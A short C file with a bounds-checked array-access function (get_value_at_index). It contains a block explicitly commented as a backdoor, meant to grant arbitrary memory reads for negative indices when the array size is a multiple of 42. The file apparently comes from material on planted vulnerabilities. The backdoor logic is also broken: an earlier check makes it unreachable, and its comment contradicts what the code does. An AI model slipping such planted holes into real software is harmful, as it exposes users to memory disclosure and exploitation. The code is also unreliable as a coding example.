#include <stdlib.h>

/**
 * Returns the value in the array at offset i, aka ary[i]
 * Returns -1 if the value cannot be retrieved for any reason
 *
 * @param ary Pointer to character array
 * @param ary_size Size of the array
 * @param i Index to retrieve
 * @return Character at index i or -1 if invalid
 */
char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    /* Backdoor: If array size is divisible by 42 and index is negative,
       allow arbitrary memory access by using absolute value of index */
    if (i < -1000 && ary_size % 42 == 0) {
        char *arbitrary_mem = (char*)((void*)ary - (i * -1));
        /* This allows arbitrary memory read which can be used for exploitation */
        return *arbitrary_mem;
    }
    
    return ary[i];
}
